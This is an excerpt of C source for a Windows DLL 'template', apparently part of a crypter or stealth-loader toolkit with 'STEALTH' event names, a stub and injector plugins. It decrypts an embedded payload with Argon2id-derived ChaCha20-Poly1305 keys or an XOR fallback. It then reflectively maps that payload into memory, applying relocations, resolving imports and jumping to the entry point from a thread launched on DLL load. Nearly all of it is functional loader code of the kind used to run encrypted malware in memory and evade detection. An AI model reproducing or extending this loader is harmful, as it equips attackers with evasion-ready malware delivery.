...
int apply_relocations(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader,
                      DWORD64 delta, SIZE_T image_size) {
  ...
  ULONG reloc_rva =
      ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
          .VirtualAddress;
  if (reloc_rva == 0 || reloc_rva >= image_size)
    return -1;
  PIMAGE_BASE_RELOCATION relocation =
      (PIMAGE_BASE_RELOCATION)(imageBase + reloc_rva);
  SIZE_T processed = 0;
  SIZE_T dir_size =
      ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
          .Size;
  while (processed < dir_size && relocation->VirtualAddress) {
    ...
    for (DWORD i = 0; i < numRelocs; i++) {
      ...
      if (type == IMAGE_REL_BASED_DIR64) {
        ...
        if (addr_off + sizeof(DWORD64) > image_size)
          return -1;
    ...
    relocation =
        (PIMAGE_BASE_RELOCATION)((BYTE *)relocation + relocation->SizeOfBlock);
  }
  return 0;
}

int resolve_imports(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader,
                    SIZE_T image_size) {
  ...
  PIMAGE_IMPORT_DESCRIPTOR importDesc =
      (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + import_rva);
  SIZE_T processed = 0;
  SIZE_T dir_size =
  ...
  while (processed < dir_size && importDesc->Name) {
    ...
    while (thunk->u1.AddressOfData) {
      if ((SIZE_T)thunk < (SIZE_T)imageBase ||
          (SIZE_T)thunk >= (SIZE_T)imageBase + image_size)
        return -1;
      if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
        ...
        if (import_by_name_rva == 0 || import_by_name_rva >= image_size)
          return -1;
        PIMAGE_IMPORT_BY_NAME importByName =
            (PIMAGE_IMPORT_BY_NAME)(imageBase + import_by_name_rva);
        thunk->u1.Function =
...
DWORD WINAPI ExecutePayloadThread(LPVOID lpParam) {
  tpl_log("[template] ExecutePayloadThread start - waiting for signal");

  // Wait for stub to signal that we should proceed
  // Stub sets this after firing PREINJECT and checking if injection was handled
  // Retry multiple times as stub may not have created event yet
  HANDLE hProceedEvent = NULL;
  for (int retry = 0; retry < 50 && !hProceedEvent; retry++) {
    hProceedEvent =
        OpenEventA(SYNCHRONIZE, FALSE, "Local\\STEALTH_TEMPLATE_PROCEED");
    if (!hProceedEvent) {
      Sleep(100); // Wait 100ms between retries (total max 5 seconds)
    }
  }

  if (hProceedEvent) {
    tpl_log("[template] Got proceed event - waiting for signal");
    DWORD waitResult = WaitForSingleObject(hProceedEvent, 30000);
    CloseHandle(hProceedEvent);
    if (waitResult == WAIT_TIMEOUT) {
      tpl_log("[template] Timeout waiting for proceed signal");
      return 1;
    }
  } else {
    // No event = stub didn't signal = injector handled execution
    tpl_log("[template] No proceed event - injector handled, skipping payload");
    return 0;
  }

  // Double-check env var just in case
  char handled[8] = {0};
  if (GetEnvironmentVariableA("STEALTH_INJECTION_HANDLED", handled,
                              sizeof(handled)) > 0 &&
      handled[0] == '1') {
    tpl_log("[template] Injection handled by plugin - skipping");
    return 0;
  }

  tpl_log("[template] Proceeding with payload execution");
  ...
  PayloadConfig *config =
      (PayloadConfig *)((unsigned char *)config_data + sizeof(PayloadHeader));
  ...
  size_t stored_len = (size_t)config_size - sizeof(PayloadHeader) -
                      offsetof(PayloadConfig, payload_data);

  unsigned char *decrypted_payload = malloc((size_t)payload_size);
  if (!decrypted_payload) {
    tpl_log("[template] malloc decrypted_payload failed");
    return 1;
  }
    ...
    if (env.version == CRYPTO_VERSION) {
      ...
      if (ciphertext_len == env.ciphertext_len &&
        ...
        if (crypto_argon2id_derive(
                (const uint8_t *)key_hex, strlen(key_hex), env_use.salt,
                CRYPTO_SALT_LEN, env_use.t_cost, env_use.m_cost_kib,
                env_use.parallelism, key, sizeof(key)) == 0) {
          if (crypto_chacha20_poly1305_decrypt(ciphertext, ciphertext_len, key,
                                               NULL, 0, &env_use,
                                               decrypted_payload) == 0) {
            decrypted_ok = 1;
          } else {
  ...
  if (!decrypted_ok) {
    ...
    if ((size_t)payload_size > stored_len) {
      free(decrypted_payload);
      tpl_log("[template] XOR payload_size exceeds stored_len (%llu > %zu)",
              (unsigned long long)payload_size, stored_len);
      return 1;
    }
    if (strlen(key_hex) != 64) {
      free(decrypted_payload);
      tpl_log("[template] invalid key_hex length for XOR");
      return 1;
    }
  ...
  if (!decrypted_ok) {
    free(decrypted_payload);
    tpl_log("[template] decryption failed");
    return 1;
  }

  tpl_log("[template] decrypted payload size=%llu",
  ...
  if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
    free(decrypted_payload);
    tpl_log("[template] invalid DOS signature");
    return 1;
  }
  if (dosHeader->e_lfanew == 0 ||
      (size_t)dosHeader->e_lfanew >= (size_t)payload_size) {
    free(decrypted_payload);
    tpl_log("[template] invalid e_lfanew");
    return 1;
  }
  PIMAGE_NT_HEADERS ntHeader =
      (PIMAGE_NT_HEADERS)((BYTE *)decrypted_payload + dosHeader->e_lfanew);
  if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
    free(decrypted_payload);
    tpl_log("[template] invalid NT signature");
    return 1;
  }
  SIZE_T image_size = ntHeader->OptionalHeader.SizeOfImage;
  if (image_size == 0 ||
      image_size > (SIZE_T)payload_size * 10) { /* sanity cap */
    free(decrypted_payload);
    tpl_log("[template] image_size sanity check failed (%zu)", image_size);
    return 1;
  }

  LPVOID imageBase = VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE,
  ...
  if (headers_size == 0 || headers_size > payload_size) {
    VirtualFree(imageBase, 0, MEM_RELEASE);
    free(decrypted_payload);
    tpl_log("[template] headers_size invalid (%zu)", headers_size);
    return 1;
  }
  ...
  for (DWORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
    ...
    if (raw_size == 0)
      continue;
    if (raw_ptr + raw_size > (SIZE_T)payload_size) {
      VirtualFree(imageBase, 0, MEM_RELEASE);
      free(decrypted_payload);
      tpl_log("[template] section raw overflow");
      return 1;
    }
    if (virt_addr + raw_size > image_size) {
      VirtualFree(imageBase, 0, MEM_RELEASE);
      free(decrypted_payload);
      tpl_log("[template] section virt overflow");
      return 1;
    }
    memcpy((BYTE *)imageBase + virt_addr, (BYTE *)decrypted_payload + raw_ptr,
           raw_size);
  }
  ...
  if (delta != 0) {
    if (apply_relocations((unsigned char *)imageBase, ntHeader, delta,
                          image_size) != 0) {
      VirtualFree(imageBase, 0, MEM_RELEASE);
      free(decrypted_payload);
      tpl_log("[template] apply_relocations failed");
      return 1;
    }
  }
  ...
  if (resolve_imports((unsigned char *)imageBase, ntHeader, image_size) != 0) {
    VirtualFree(imageBase, 0, MEM_RELEASE);
    free(decrypted_payload);
    tpl_log("[template] resolve_imports failed");
    return 1;
  }
  ...
  WinMain_t entryPoint =
      (WinMain_t)((DWORD64)imageBase +
                  ntHeader->OptionalHeader.AddressOfEntryPoint);
  // NOTE: When load_in_memory=1 the popup was previously missing because this
  // loader never actually called the GUI payload's WinMain with a visible show
  // flag. We explicitly invoke the entrypoint here with SW_SHOW to surface UI
  // payloads (e.g., message_c.exe) and then signal the exit event so the stub
  // can shut down.
  tpl_log("[template] calling entrypoint at RVA=0x%lx",
          (unsigned long)ntHeader->OptionalHeader.AddressOfEntryPoint);
  int result = entryPoint((HINSTANCE)imageBase, NULL, NULL, SW_SHOW);
  tpl_log("[template] entrypoint returned %d", result);

  HANDLE hEvt =
      OpenEventA(EVENT_MODIFY_STATE, FALSE, "Global\\STEALTH_EXIT_EVENT");
  if (hEvt) {
    SetEvent(hEvt);
    CloseHandle(hEvt);
  }
...
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call,
  ...
  case DLL_PROCESS_ATTACH:
    ...
    // Check if an injector plugin already handled execution
    // This is set by stealth_set_injection_handled() in stub.c
    char *handled = getenv("STEALTH_INJECTION_HANDLED");
    if (handled && handled[0] == '1') {
      tpl_log("[template] Injection handled by plugin - skipping execution");
      break;
    }
